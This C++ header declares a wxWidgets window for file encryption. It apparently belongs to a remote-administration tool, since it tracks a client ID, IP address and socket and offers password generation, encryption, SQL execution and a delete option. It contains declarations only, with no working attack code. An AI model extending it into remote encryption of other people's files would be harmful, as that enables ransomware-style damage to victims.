#ifndef ___CRYPT_
#define ___CRYPT_

#include "headers.hpp"

class frameEncryption : public wxFrame {
	public:
		frameEncryption(wxWindow* pParent, std::string _strPath, std::string _strID, std::string _strIP, SOCKET _sck);

		void OnGenerarPass(wxCommandEvent& event);
		void OnExecCrypt(wxCommandEvent& event);
		void Exec_SQL(const char* cCMD);
		
	private:
		std::string p_strPath = "";
		std::string strID     = "";
		std::string strIP     = "";
		SOCKET sckCliente = INVALID_SOCKET;
		wxTextCtrl* txt_Pass = nullptr;
		wxRadioBox* rdio_Options = nullptr;
		wxCheckBox* chk_del = nullptr;

		wxDECLARE_EVENT_TABLE();
};

#endif // !___CRYPT
